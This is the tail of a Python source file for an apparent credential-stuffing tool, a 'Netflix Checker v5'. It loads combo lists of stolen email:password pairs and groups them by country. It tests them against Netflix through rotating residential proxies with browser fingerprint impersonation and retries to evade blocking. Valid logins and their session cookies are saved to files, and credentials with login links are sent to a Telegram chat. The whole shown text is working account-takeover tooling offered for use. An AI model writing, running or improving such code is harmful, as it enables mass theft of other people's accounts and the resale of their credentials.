            if any(x in err for x in _NET_ERR):
                if pool:
                    proxy_url = pool.next()
                    ch = _pick()
                    ua, sec, pf, plat = ch['ua'], ch['sec'], ch['pf'], ch['plat']
                time.sleep(random.uniform(1, 3))
                continue
            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5) * (attempt + 1))
                continue
            if net_only:
                return 'RETRY', '', '', None
            return 'BAD', '', '', None

    return 'RETRY', '', '', None


def _parse_combo(line):
    line = line.strip()
    if not line:
        return None

    url = ''
    creds = line

    if re.match(r'(?:https?://)?www\d?\.netflix\.com', line):
        m = re.match(r'((?:https?://)?www\d?\.netflix\.com[^:]*)', line)
        if m:
            url = m.group(1)
            rest = line[m.end():]
            creds = rest.lstrip(':')
    else:
        ms = list(re.finditer(r':(?:https?://)?www\d?\.netflix\.com', line))
        if ms:
            m = ms[-1]
            creds = line[:m.start()]
            url = line[m.start() + 1:]

    idx = creds.find(':')
    if idx <= 0:
        return None
    email = creds[:idx].strip()
    pw = creds[idx + 1:].strip()
    if not email or not pw or '@' not in email:
        return None

    country = 'XX'
    cm = re.search(r'netflix\.com/([a-z]{2})(?:-[a-z]{2})?(?:/|$)', url.lower())
    if cm:
        country = cm.group(1).upper()

    return email, pw, country


def _parse_proxy(raw):
    raw = raw.strip()
    if not raw:
        return '', '', '', '0', 'http'

    proto = 'http'
    for p in ['socks5h://', 'socks5://', 'socks4a://', 'socks4://', 'https://', 'http://']:
        if raw.lower().startswith(p):
            proto = p.rstrip(':/')
            raw = raw[len(p):]
            break

    if '@' in raw:
        auth, hp = raw.rsplit('@', 1)
        ci = auth.find(':')
        user = auth[:ci].strip() if ci > 0 else auth.strip()
        pw = auth[ci + 1:].strip() if ci > 0 else ''
        hp = hp.strip().rstrip('/')
        if hp.startswith('['):
            cb = hp.find(']')
            if cb > 0:
                host = hp[1:cb]
                port = hp[cb + 2:] if cb + 1 < len(hp) and hp[cb + 1] == ':' else '8080'
            else:
                host, port = hp, '8080'
        else:
            parts = hp.rsplit(':', 1)
            host = parts[0]
            port = parts[1] if len(parts) > 1 and parts[1].isdigit() else '8080'
        return user, pw, host, port, proto

    raw = raw.rstrip('/')
    parts = raw.split(':')
    parts = [p.strip() for p in parts]

    def _is_port(v):
        return v.isdigit() and 1 <= int(v) <= 65535

    def _is_ip(v):
        return bool(re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', v))

    if len(parts) == 2:
        return '', '', parts[0], parts[1] if _is_port(parts[1]) else '8080', proto

    if len(parts) == 3:
        if _is_port(parts[1]):
            return parts[2], '', parts[0], parts[1], proto
        return '', '', parts[0], parts[2] if _is_port(parts[2]) else '8080', proto

    if len(parts) == 4:
        p1 = _is_port(parts[1])
        p3 = _is_port(parts[3])
        if p1 and not p3:
            return parts[2], parts[3], parts[0], parts[1], proto
        if p3 and not p1:
            return parts[0], parts[1], parts[2], parts[3], proto
        if p1 and p3:
            if _is_ip(parts[0]):
                return parts[2], parts[3], parts[0], parts[1], proto
            if _is_ip(parts[2]):
                return parts[0], parts[1], parts[2], parts[3], proto
            return parts[2], parts[3], parts[0], parts[1], proto
        return parts[2], parts[3], parts[0], parts[1], proto

    if len(parts) > 4:
        if _is_port(parts[-1]):
            host = parts[-2]
            port = parts[-1]
            user = parts[0]
            pw = ':'.join(parts[1:-2])
            return user, pw, host, port, proto

    return '', '', raw, '8080', proto


def _country_proxy_url(user, pw, host, port, proto, cc):
    u = re.sub(r'-country-[a-zA-Z]{2}', '', user)
    if cc and cc != 'XX':
        u = f"{u}-country-{cc.lower()}"
    if u and pw:
        return f"{proto}://{u}:{pw}@{host}:{port}"
    if u:
        return f"{proto}://{u}@{host}:{port}"
    return f"{proto}://{host}:{port}"


def _detect_country(proxy_url=None):
    try:
        _s = creq.Session(impersonate="chrome136") if CURL_OK else creq.Session()
        if proxy_url:
            _s.proxies = {'http': proxy_url, 'https': proxy_url}
        r = _s.get('https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location',
                   headers={'accept': 'application/json', 'origin': 'https://www.netflix.com'},
                   timeout=10)
        c = r.json().get('country', 'US')
    except Exception:
        c = 'US'
    return c, c.lower(), PHONE_CODES.get(c, '1')


class ProxyPool:
    def __init__(self, lst):
        self._l = lst
        self._i = 0
        self._k = threading.Lock()

    def next(self):
        with self._k:
            p = self._l[self._i % len(self._l)]
            self._i += 1
            return p


def _worker(q, pool, stats, country, lowcode, cc, out, tg_tok, tg_chat, done_ev):
    while not done_ev.is_set():
        try:
            item = q.get(timeout=1)
        except queue.Empty:
            continue

        try:
            if isinstance(item, tuple) and len(item) == 3:
                email, pw, retries = item
            elif isinstance(item, tuple) and len(item) == 2:
                combo_str, retries = item
                if ':' not in combo_str:
                    q.task_done()
                    continue
                email, pw = combo_str.split(':', 1)
            else:
                combo_str = str(item)
                retries = 0
                if ':' not in combo_str:
                    q.task_done()
                    continue
                email, pw = combo_str.split(':', 1)

            email = email.strip()
            pw = pw.strip()

            if not email or not pw:
                q.task_done()
                continue

            proxy_url = pool.next() if pool else None
            status, detail, cookies, links = _check(email, pw, proxy_url, country, lowcode, cc, pool=pool)

            if status == 'RETRY':
                if retries < MAX_OUTER:
                    stats.add_retry()
                    q.put((email, pw, retries + 1))
                    q.task_done()
                    continue
                status = 'BAD'

            stats.add(status.lower())
            ep = f"{email}:{pw}"

            if status == 'HIT':
                line = f"{ep} | {detail}"
                _log('HIT', line)
                _save(out['hit'], line)
                if cookies:
                    _save(out['cookies'], f"{ep} | {cookies}")
                tg_text = (
                    f"<b>\U0001f3c6 NETFLIX HIT</b>\n\n"
                    f"\U0001f4e7 <b>Email:</b>  <code>{email}</code>\n"
                    f"\U0001f511 <b>Pass:</b>   <code>{pw}</code>\n"
                    f"\U0001f4cb <b>Info:</b>   {detail}\n\n"
                    f"-- by {TAG}")
                tg_buttons = None
                if links:
                    row1 = []
                    if links.get('pc'):
                        row1.append({"text": "\U0001f5a5 PC Login", "url": links['pc']})
                    if links.get('phone'):
                        row1.append({"text": "\U0001f4f1 Phone Login", "url": links['phone']})
                    tg_buttons = []
                    if row1:
                        tg_buttons.append(row1)
                    if links.get('tv'):
                        tg_buttons.append([{"text": "\U0001f4fa TV Login", "url": links['tv']}])
                _tg(tg_tok, tg_chat, tg_text, tg_buttons)
            elif status == 'FREE':
                line = f"{ep} | {detail}"
                _log('FREE', line)
                _save(out['free'], line)
                if cookies:
                    _save(out['cookies'], f"{ep} | {cookies}")
            else:
                _save(out['bad'], ep)

            _bar(stats)

        except Exception:
            try:
                stats.add('bad')
                if 'email' in dir() and 'pw' in dir():
                    _save(out['bad'], f"{email}:{pw}")
            except Exception:
                pass
        finally:
            try:
                q.task_done()
            except ValueError:
                pass


BANNER = f"""{R}{BD}
    ███    ██ ███████ ████████ ███████ ██      ██ ██   ██
    ████   ██ ██         ██    ██      ██      ██  ██ ██
    ██ ██  ██ █████      ██    █████   ██      ██   ███
    ██  ██ ██ ██         ██    ██      ██      ██  ██ ██
    ██   ████ ███████    ██    ██      ███████ ██ ██   ██
{RS}{DIM}          Checker v5  |  Country-aware  |  Resi Proxy{RS}
{C}{BD}                     @baron_saplar{RS}
"""


def _summary(stats, out, label=''):
    s = stats
    hdr = f"  {label}" if label else ""
    print(f"\n\n{BD}{'=' * 56}{RS}{hdr}")
    print(f"  {G}{BD}HIT    : {s.hit}{RS}")
    print(f"  {R}BAD    : {s.bad}{RS}")
    print(f"  {Y}FREE   : {s.free}{RS}")
    if s.retry:
        print(f"  {DIM}RETRY  : {s.retry}{RS}")
    print(f"  Total  : {s.done} / {s.total}")
    print(f"  Time   : {s.elapsed}")
    print(f"{BD}{'=' * 56}{RS}")
    print(f"\n  Output -> {BD}{os.path.dirname(out['hit'])}{os.sep}{RS}")
    for k, p in out.items():
        if os.path.exists(p) and os.path.getsize(p) > 0:
            sz = os.path.getsize(p)
            print(f"    {k.upper():7} : {os.path.basename(p)}  ({sz:,} bytes)")
    print()


def main():
    os.system('')
    print(BANNER)

    if not CURL_OK:
        print(f"{Y}[!] curl_cffi not installed -- no TLS fingerprint!")
        print(f"[!] pip install curl-cffi{RS}\n")

    combo_file = input(f"{C}[?]{RS} Combo file : ").strip().strip('"')
    if not os.path.exists(combo_file):
        print(f"{R}[!] File not found: {combo_file}{RS}")
        return

    proxy_raw = input(f"{C}[?]{RS} Proxy (string or file) : ").strip().strip('"')
    tg_tok    = input(f"{C}[?]{RS} Telegram token (blank=skip) : ").strip()
    tg_chat   = input(f"{C}[?]{RS} Telegram chat  (blank=skip) : ").strip()
    threads_s = input(f"{C}[?]{RS} Threads [50] : ").strip()
    out_dir   = input(f"{C}[?]{RS} Output folder [nf_output] : ").strip() or "nf_output"

    threads_n = int(threads_s) if threads_s.isdigit() else 50

    proxy_components = []
    if proxy_raw:
        if os.path.exists(proxy_raw):
            with open(proxy_raw, encoding='utf-8', errors='replace') as f:
                for ln in f:
                    ln = ln.strip()
                    if not ln or ln.startswith('#') or ln.startswith('//'):
                        continue
                    pc = _parse_proxy(ln)
                    if pc[2]:
                        proxy_components.append(pc)
            print(f"{G}[+]{RS} Loaded {BD}{len(proxy_components)}{RS} proxies from file")
        else:
            proxy_components.append(_parse_proxy(proxy_raw))
            u, p, h, pt, pr = proxy_components[0]
            print(f"{G}[+]{RS} Proxy: {BD}{h}:{pt}{RS}")
    else:
        print(f"{Y}[!]{RS} No proxy -- direct connection")
        if threads_n > 5:
            print(f"{Y}[!]{RS} Threads capped to 5")
            threads_n = 5

    with open(combo_file, encoding='utf-8', errors='replace') as f:
        raw_lines = [ln.strip() for ln in f if ln.strip()]

    by_country = defaultdict(list)
    skipped = 0
    for line in raw_lines:
        parsed = _parse_combo(line)
        if parsed:
            email, pw, cc = parsed
            by_country[cc].append((email, pw))
        else:
            skipped += 1

    total_combos = sum(len(v) for v in by_country.values())
    print(f"{G}[+]{RS} Parsed {BD}{total_combos}{RS} combos" +
          (f" ({DIM}{skipped} skipped{RS})" if skipped else ""))

    if not by_country:
        print(f"{R}[!] No valid combos{RS}")
        return

    sorted_known = sorted(
        [(cc, combos) for cc, combos in by_country.items() if cc != 'XX'],
        key=lambda x: -len(x[1]))
    xx_combos = by_country.get('XX', [])

    print(f"\n  {BD}{'#':>3}  {'Country':<14} {'Combos':>6}{RS}")
    print(f"  {DIM}{'-' * 30}{RS}")
    for i, (cc, combos) in enumerate(sorted_known, 1):
        fl = _flag(cc)
        print(f"  {BD}{i:>3}{RS}  {fl} {cc:<12} {G}{len(combos):>6}{RS}")
    if xx_combos:
        print(f"  {DIM}{'-' * 30}{RS}")
        print(f"  {BD}{'?':>3}{RS}  {'XX (unknown)':<14} {Y}{len(xx_combos):>6}{RS}")
    print()

    n_known = len(sorted_known)
    sel = input(f"{C}[?]{RS} [{G}A{RS}]ll / [{G}1-{n_known}{RS}] specific / [{R}Q{RS}]uit : ").strip().lower()

    if sel == 'q':
        return

    if sel.isdigit() and 1 <= int(sel) <= n_known:
        selected = [sorted_known[int(sel) - 1]]
    else:
        selected = sorted_known[:]

    os.makedirs(out_dir, exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    out = {
        'hit':     os.path.join(out_dir, f'hits_{ts}.txt'),
        'bad':     os.path.join(out_dir, f'bad_{ts}.txt'),
        'free':    os.path.join(out_dir, f'free_{ts}.txt'),
        'cookies': os.path.join(out_dir, f'cookies_{ts}.txt'),
    }

    grand_hit = grand_bad = grand_free = grand_retry = 0
    stopped = False

    def _run_batch(cc, combos, proxy_components, threads_n, out, tg_tok, tg_chat):
        fl = _flag(cc) if cc != 'XX' else ''
        cc_upper = cc if cc != 'XX' else 'US'

        if proxy_components:
            cc_proxies = [_country_proxy_url(u, p, h, pt, pr, cc) for u, p, h, pt, pr in proxy_components]
        else:
            cc_proxies = []

        if cc != 'XX':
            country = cc_upper
            lowcode = country.lower()
            phone_cc = PHONE_CODES.get(country, '1')
        else:
            if cc_proxies:
                print(f"{DIM}[*] Detecting country for XX combos...{RS}", end=' ', flush=True)
                country, lowcode, phone_cc = _detect_country(cc_proxies[0])
                print(f"{G}{country}{RS} {_flag(country)}")
            else:
                country, lowcode, phone_cc = 'US', 'us', '1'

        pool = ProxyPool(cc_proxies) if cc_proxies else None
        actual = min(threads_n, len(combos))

        print(f"\n{C}[*]{RS} {BD}Checking {fl} {cc}{RS} ({len(combos)} combos) | "
              f"{actual} threads | "
              f"proxy: {BD}{proxy_components[0][2] if proxy_components else 'direct'}{RS}"
              f"{f' ({cc_upper})' if proxy_components and cc != 'XX' else ''}\n")

        q = queue.Queue()
        for email, pw in combos:
            q.put((email, pw, 0))

        stats = Stats(len(combos))
        done_ev = threading.Event()

        workers = []
        for _ in range(actual):
            t = threading.Thread(target=_worker,
                                 args=(q, pool, stats, country, lowcode, phone_cc,
                                       out, tg_tok, tg_chat, done_ev),
                                 daemon=True)
            t.start()
            workers.append(t)

        interrupted = False
        try:
            q.join()
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Stopped.{RS}")
            done_ev.set()
            for t in workers:
                t.join(timeout=2)
            interrupted = True

        if not interrupted:
            done_ev.set()
            for t in workers:
                t.join(timeout=2)

        _summary(stats, out, label=f"{fl} {cc}")
        return stats, interrupted

    for batch_idx, (cc, combos) in enumerate(selected):
        batch_stats, stopped = _run_batch(cc, combos, proxy_components, threads_n,
                                          out, tg_tok, tg_chat)
        grand_hit += batch_stats.hit
        grand_bad += batch_stats.bad
        grand_free += batch_stats.free
        grand_retry += batch_stats.retry
        if stopped:
            break
        if batch_idx < len(selected) - 1:
            time.sleep(1)

    if not stopped and xx_combos:
        print(f"\n{C}[*]{RS} {Y}{len(xx_combos)}{RS} unknown-country combos remaining.")
        xx_sel = input(f"{C}[?]{RS} Scan them? [{G}Y{RS}/{R}N{RS}] : ").strip().lower()
        if xx_sel in ('y', 'yes', 'e', 'evet', ''):
            batch_stats, _ = _run_batch('XX', xx_combos, proxy_components, threads_n,
                                        out, tg_tok, tg_chat)
            grand_hit += batch_stats.hit
            grand_bad += batch_stats.bad
            grand_free += batch_stats.free
            grand_retry += batch_stats.retry

    total_batches = len(selected) + (1 if not stopped and xx_combos else 0)
    if total_batches > 1 or xx_combos:
        print(f"\n{BD}{'=' * 56}{RS}")
        print(f"  {BD}GRAND TOTAL{RS}")
        print(f"  {G}{BD}HIT    : {grand_hit}{RS}")
        print(f"  {R}BAD    : {grand_bad}{RS}")
        print(f"  {Y}FREE   : {grand_free}{RS}")
        if grand_retry:
            print(f"  {DIM}RETRY  : {grand_retry}{RS}")
        print(f"  Total  : {grand_hit + grand_bad + grand_free}")
        print(f"{BD}{'=' * 56}{RS}\n")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
